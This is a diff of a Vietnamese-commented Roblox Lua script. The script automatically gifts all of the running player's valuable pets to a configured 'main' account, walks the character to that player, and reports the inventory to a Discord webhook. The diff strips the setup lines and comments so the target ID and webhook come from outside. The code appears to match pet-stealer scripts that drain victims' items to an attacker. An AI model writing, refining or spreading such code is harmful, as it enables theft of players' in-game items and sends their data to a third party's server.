@@ -1,6 +1,3 @@
-getgenv().id = "12345678" -- Thay bằng UserId acc chính
-getgenv().webhook = "https://discord.com/api/webhooks/..." -- Thay bằng webhook của bạn
-
 print("✅ Script đang khởi động...")
 
 local Players = game:GetService("Players")
@@ -22,7 +19,6 @@ local PET_NAMES = {
     "Butterfly", "Dragon Fly", "Queen Bee", "Disco Bee"
 }
 
--- 🔍 Tìm acc chính trong server
 local function getMainPlayer()
     for _, p in ipairs(Players:GetPlayers()) do
         if p.UserId == MAIN_USER_ID then
@@ -32,17 +28,16 @@ local function getMainPlayer()
     return nil
 end
 
--- 🐾 Lấy danh sách pet đúng
 local function getValidPetTools()
     local pets = {}
     for _, container in ipairs({LocalPlayer:FindFirstChild("Backpack"), LocalPlayer.Character}) do
         if container then
             for _, tool in ipairs(container:GetChildren()) do
                 if tool:IsA("Tool") then
-                    local toolNameLower = string.lower(tool.Name)
+                    local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
                     for _, pet in ipairs(PET_NAMES) do
-                        if toolNameLower:sub(1, #pet):lower() == pet:lower() then
-                            table.insert(pets, {tool = tool, name = pet})
+                        if baseName:lower() == pet:lower() then
+                            table.insert(pets, {tool = tool, name = baseName})
                             break
                         end
                     end
@@ -53,13 +48,11 @@ local function getValidPetTools()
     return pets
 end
 
--- 🎁 Gửi pet
 local function giftPetTo(player, petName)
     local giftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
     giftRemote:FireServer(player, petName)
 end
 
--- 👣 Di chuyển lại gần
 local function moveToPlayer(target)
     local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
     local tgt = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
@@ -72,7 +65,6 @@ local function moveToPlayer(target)
     end
 end
 
--- 🤖 Auto gift toàn bộ pet
 local function autoGiftAllPets(mainPlayer)
     local pets = getValidPetTools()
     if #pets == 0 then
@@ -92,7 +84,6 @@ local function autoGiftAllPets(mainPlayer)
     end
 end
 
--- 🌐 Gửi embed webhook
 local function sendWebhook()
     if WEBHOOK_URL == "" then return end
 
@@ -135,7 +126,6 @@ local function sendWebhook()
     end
 end
 
--- 🧠 Khởi động
 task.spawn(function()
     task.wait(2)
 
